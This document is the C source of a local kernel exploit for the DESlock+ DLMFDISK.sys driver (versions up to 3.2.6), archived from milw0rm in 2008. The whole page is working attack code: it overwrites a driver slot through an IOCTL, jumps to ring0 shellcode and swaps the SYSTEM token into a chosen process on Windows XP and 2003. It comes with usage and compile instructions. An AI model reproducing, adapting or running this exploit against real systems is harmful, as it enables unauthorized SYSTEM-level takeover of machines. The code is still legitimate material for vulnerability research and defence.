<html><head><title>DESlock+ <= 3.2.6 DLMFDISK.sys local kernel ring0 SYSTEM Exploit</title></head><pre>/* deslock-pown-v2.c
 *
 * Copyright (c) 2008 by &lt;mu-b@digit-labs.org&gt;
 *
 * DESlock+ &lt;= 3.2.6 local kernel ring0 SYSTEM exploit
 * by mu-b - Wed 26 Dec 2007
 *
 * - Tested on: DLMFDISK.sys 1.2.0.27
 *              - Microsoft Windows 2003 SP2
 *              - Microsoft Windows XP SP2
 *
 * Note: create a mountable filesystem (size/password is irrelevant),
 * name the pseudo-filesystem &quot;XXXAAAA.mnt&quot; and copy to &quot;?:\&quot;,
 * finally mount the pseudo-filesystem and ./deslock-pown-v2 for SYSTEM.
 *
 * Compile: MinGW + -lntdll
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#include &lt;windows.h&gt;
#include &lt;ddk/ntapi.h&gt;

#define DLKFDISK_IOCTL    0x80002024
#define DLKFDISK_R_IOCTL  0x80002010
#define DLKFDISK_SLOT     0x00000C5A
#define DLKFDISK_OFFSET   0x0D
#define DLKFDISK_DISK_MAX 0x1A

static unsigned char win32_fixup[] =
  &quot;\x53&quot;
  &quot;\xeb\x0e&quot;
  /* _fixup_copy  */
  &quot;\x5e&quot;
  &quot;\xbf\x5c\x0c\x00\x00&quot;
  &quot;\x31\xc9&quot;
  &quot;\xb1\x05&quot;
  &quot;\xf3\xa5&quot;
  &quot;\xeb\x19&quot;
  /* _fixup_blk   */
  &quot;\xe8\xed\xff\xff\xff&quot;
  &quot;\x64\x0a\x00\x00&quot;
  &quot;\xd3\x0a\x00\x00&quot;
  &quot;\x2a\x0a\x00\x00&quot;
  &quot;\x49\x0a\x00\x00&quot;
  &quot;\x68\x0b\x00\x00&quot;;

/* Win2k3 SP1/2 - kernel EPROCESS token switcher
 * by mu-b &lt;mu-b@digit-lab.org&gt;
 */
static unsigned char win2k3_ring0_shell[] =
  /* _ring0 */
  &quot;\xb8\x24\xf1\xdf\xff&quot;
  &quot;\x8b\x00&quot;
  &quot;\x8b\xb0\x18\x02\x00\x00&quot;
  &quot;\x89\xf0&quot;
  /* _sys_eprocess_loop   */
  &quot;\x8b\x98\x94\x00\x00\x00&quot;
  &quot;\x81\xfb\x04\x00\x00\x00&quot;
  &quot;\x74\x11&quot;
  &quot;\x8b\x80\x9c\x00\x00\x00&quot;
  &quot;\x2d\x98\x00\x00\x00&quot;
  &quot;\x39\xf0&quot;
  &quot;\x75\xe3&quot;
  &quot;\xeb\x21&quot;
  /* _sys_eprocess_found  */
  &quot;\x89\xc1&quot;
  &quot;\x89\xf0&quot;

  /* _cmd_eprocess_loop   */
  &quot;\x8b\x98\x94\x00\x00\x00&quot;
  &quot;\x81\xfb\x00\x00\x00\x00&quot;
  &quot;\x74\x10&quot;
  &quot;\x8b\x80\x9c\x00\x00\x00&quot;
  &quot;\x2d\x98\x00\x00\x00&quot;
  &quot;\x39\xf0&quot;
  &quot;\x75\xe3&quot;
  /* _not_found           */
  &quot;\xcc&quot;
  /* _cmd_eprocess_found
   * _ring0_end           */

  /* copy tokens!$%!      */
  &quot;\x8b\x89\xd8\x00\x00\x00&quot;
  &quot;\x89\x88\xd8\x00\x00\x00&quot;
  &quot;\x90&quot;;

static unsigned char winxp_ring0_shell[] =
  /* _ring0 */
  &quot;\xb8\x24\xf1\xdf\xff&quot;
  &quot;\x8b\x00&quot;
  &quot;\x8b\x70\x44&quot;
  &quot;\x89\xf0&quot;
  /* _sys_eprocess_loop   */
  &quot;\x8b\x98\x84\x00\x00\x00&quot;
  &quot;\x81\xfb\x04\x00\x00\x00&quot;
  &quot;\x74\x11&quot;
  &quot;\x8b\x80\x8c\x00\x00\x00&quot;
  &quot;\x2d\x88\x00\x00\x00&quot;
  &quot;\x39\xf0&quot;
  &quot;\x75\xe3&quot;
  &quot;\xeb\x21&quot;
  /* _sys_eprocess_found  */
  &quot;\x89\xc1&quot;
  &quot;\x89\xf0&quot;

  /* _cmd_eprocess_loop   */
  &quot;\x8b\x98\x84\x00\x00\x00&quot;
  &quot;\x81\xfb\x00\x00\x00\x00&quot;
  &quot;\x74\x10&quot;
  &quot;\x8b\x80\x8c\x00\x00\x00&quot;
  &quot;\x2d\x88\x00\x00\x00&quot;
  &quot;\x39\xf0&quot;
  &quot;\x75\xe3&quot;
  /* _not_found           */
  &quot;\xcc&quot;
  /* _cmd_eprocess_found
   * _ring0_end           */

  /* copy tokens!$%!      */
  &quot;\x8b\x89\xc8\x00\x00\x00&quot;
  &quot;\x89\x88\xc8\x00\x00\x00&quot;
  &quot;\x90&quot;;

static unsigned char win32_ret[] =
  &quot;\x5b&quot;
  &quot;\x31\xff&quot;
  &quot;\xb8\xdc\x0b\x00\x00&quot;
  &quot;\xff\xe0&quot;
  &quot;\xcc&quot;;

struct ioctl_req {
  void *arg[20];
};

static PCHAR
fixup_ring0_shell (PVOID base, DWORD ppid, DWORD *zlen)
{
  DWORD dwVersion, dwMajorVersion, dwMinorVersion;

  dwVersion = GetVersion ();
  dwMajorVersion = (DWORD) (LOBYTE(LOWORD(dwVersion)));
  dwMinorVersion = (DWORD) (HIBYTE(LOWORD(dwVersion)));

  if (dwMajorVersion != 5)
    {
      fprintf (stderr, &quot;* GetVersion, unsupported version\n&quot;);
      exit (EXIT_FAILURE);
    }

  *(PDWORD) &amp;win32_fixup[5]  += (DWORD) base;
  *(PDWORD) &amp;win32_fixup[22] += (DWORD) base;
  *(PDWORD) &amp;win32_fixup[26] += (DWORD) base;
  *(PDWORD) &amp;win32_fixup[30] += (DWORD) base;
  *(PDWORD) &amp;win32_fixup[34] += (DWORD) base;
  *(PDWORD) &amp;win32_fixup[38] += (DWORD) base;

  *(PDWORD) &amp;win32_ret[4] += (DWORD) base;

  switch (dwMinorVersion)
    {
      case 1:
        *zlen = sizeof winxp_ring0_shell - 1;
        *(PDWORD) &amp;winxp_ring0_shell[55] = ppid;
        return (winxp_ring0_shell);

      case 2:
        *zlen = sizeof win2k3_ring0_shell - 1;
        *(PDWORD) &amp;win2k3_ring0_shell[58] = ppid;
        return (win2k3_ring0_shell);

      default:
        fprintf (stderr, &quot;* GetVersion, unsupported version\n&quot;);
        exit (EXIT_FAILURE);
    }

  return (NULL);
}

static PVOID
get_module_base (void)
{
  PSYSTEM_MODULE_INFORMATION_ENTRY pModuleBase;
  PSYSTEM_MODULE_INFORMATION pModuleInfo;
  DWORD i, num_modules, status, rlen;
  PVOID result;

  status = NtQuerySystemInformation (SystemModuleInformation, NULL, 0, &amp;rlen);
  if (status != STATUS_INFO_LENGTH_MISMATCH)
    {
      fprintf (stderr, &quot;* NtQuerySystemInformation failed, 0x%08X\n&quot;, status);
      exit (EXIT_FAILURE);
    }

  pModuleInfo = (PSYSTEM_MODULE_INFORMATION) HeapAlloc (GetProcessHeap (), HEAP_ZERO_MEMORY, rlen);

  status = NtQuerySystemInformation (SystemModuleInformation, pModuleInfo, rlen, &amp;rlen);
  if (status != STATUS_SUCCESS)
    {
      fprintf (stderr, &quot;* NtQuerySystemInformation failed, 0x%08X\n&quot;, status);
      exit (EXIT_FAILURE);
    }

  num_modules = pModuleInfo-&gt;Count;
  pModuleBase = &amp;pModuleInfo-&gt;Module[0];
  result = NULL;

  for (i = 0; i &lt; num_modules; i++, pModuleBase++)
    if (strstr (pModuleBase-&gt;ImageName, &quot;dlkfdisk.sys&quot;))
      {
        result = pModuleBase-&gt;Base;
        break;
      }

  HeapFree (GetProcessHeap (), HEAP_NO_SERIALIZE, pModuleInfo);

  return (result);
}

int
main (int argc, char **argv)
{
  struct ioctl_req req;
  DWORD disk_no, i, rlen, zlen, ppid;
  CHAR rbuf[64], sbuf[512];
  LPVOID zpage, zbuf, base;
  HANDLE hFile;
  BOOL result;

  printf (&quot;DESlock+ &lt;= 3.2.6 local kernel ring0 SYSTEM exploit\n&quot;
          &quot;by: &lt;mu-b@digit-labs.org&gt;\n&quot;
          &quot;http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n&quot;);

  if (argc &lt;= 1)
    {
      fprintf (stderr, &quot;Usage: %s &lt;processid to elevate&gt;\n&quot;, argv[0]);
      exit (EXIT_SUCCESS);
    }

  ppid = atoi (argv[1]);

  hFile = CreateFileA (&quot;\\\\.\\DLKFDisk_Control&quot;, FILE_EXECUTE,
                       FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
                       OPEN_EXISTING, 0, NULL);
  if (hFile == INVALID_HANDLE_VALUE)
    {
      fprintf (stderr, &quot;* CreateFileA failed, %d\n&quot;, hFile);
      exit (EXIT_FAILURE);
    }

  for (i = 0; i &lt; DLKFDISK_DISK_MAX; i++)
    {
      memset (&amp;req, 0, sizeof req);
      req.arg[0] = (void *) 0xDEADBEEF;
      req.arg[1] = (void *) 0xDEADBEEF;
      req.arg[2] = (void *) 0xDEADBEEF;
      req.arg[3] = (void *) i;            /* drive number   */
      req.arg[4] = (void *) sizeof sbuf;  /* buffer size    */
      req.arg[5] = (void *) sbuf;         /* buffer pointer */

      result = DeviceIoControl (hFile, DLKFDISK_IOCTL,
                                &amp;req, sizeof req, rbuf, sizeof rbuf, &amp;rlen, 0);
      if (!result)
        {
          fprintf (stderr, &quot;* DeviceIoControl failed\n&quot;);
          exit (EXIT_FAILURE);
        }

      if (strlen (sbuf + DLKFDISK_OFFSET - 1) &gt; 6 &amp;&amp;
          strcmp (sbuf + DLKFDISK_OFFSET - 1 + 6, &quot;:\\XXXAAAA.mnt&quot;) == 0)
        {
          disk_no = i;
          break;
        }
    }
  printf (&quot;* write buf: \&quot;%s\&quot;\n&quot;, &amp;sbuf[DLKFDISK_OFFSET - 1]);

  zpage = VirtualAlloc ((LPVOID) 0x41410000, 0x10000,
                        MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (zpage == NULL)
    {
      fprintf (stderr, &quot;* VirtualAlloc failed\n&quot;);
      exit (EXIT_FAILURE);
    }
  printf (&quot;* allocated page: 0x%08X [%d-bytes]\n&quot;,
          zpage, 0x10000);

  base = get_module_base ();
  if (base == NULL)
    {
      fprintf (stderr, &quot;* unable to find dlkfdisk.sys base\n&quot;);
      exit (EXIT_FAILURE);
    }
  printf (&quot;* dlkfdisk.sys base: 0x%08X\n&quot;, base);

  memset (zpage, 0xCC, 0x10000);
  zbuf = fixup_ring0_shell (base, ppid, &amp;zlen);
  memcpy ((LPVOID) 0x41414141, win32_fixup, sizeof (win32_fixup) - 1);
  memcpy ((LPVOID) (0x41414141 + sizeof (win32_fixup) - 1), zbuf, zlen);
  memcpy ((LPVOID) (0x41414141 + sizeof (win32_fixup) + zlen - 1),
          win32_ret, sizeof (win32_ret) - 1);

  memset (&amp;req, 0, sizeof req);
  req.arg[0] = (void *) 0xDEADBEEF;
  req.arg[1] = (void *) 0xDEADBEEF;
  req.arg[2] = (void *) 0xDEADBEEF;
  req.arg[3] = (void *) disk_no;                                    /* drive number   */
  req.arg[4] = (void *) 512;                                        /* buffer size    */
  req.arg[5] = (void *) (base + DLKFDISK_SLOT - DLKFDISK_OFFSET);   /* buffer pointer */

  printf (&quot;* overwriting [@0x%08X %d-bytes].. &quot;,
          base + DLKFDISK_SLOT, strlen (sbuf + DLKFDISK_OFFSET - 1) + 1);
  result = DeviceIoControl (hFile, DLKFDISK_IOCTL,
                            &amp;req, sizeof req, rbuf, sizeof rbuf, &amp;rlen, 0);
  if (!result)
    {
      fprintf (stderr, &quot;DeviceIoControl failed\n&quot;);
      exit (EXIT_FAILURE);
    }
  printf (&quot;done\n&quot;);

  /* jump to our address :) */
  printf (&quot;* jumping.. &quot;);
  result = DeviceIoControl (hFile, DLKFDISK_R_IOCTL,
                            &amp;req, sizeof req, rbuf, sizeof rbuf, &amp;rlen, 0);
  if (!result)
    {
      fprintf (stderr, &quot;DeviceIoControl failed\n&quot;);
      exit (EXIT_FAILURE);
    }
  printf (&quot;done\n\n&quot;
          &quot;* hmmm, you didn't STOP the box?!?!\n&quot;);

  CloseHandle (hFile);

  return (EXIT_SUCCESS);
}

// milw0rm.com [2008-02-18]</pre></html>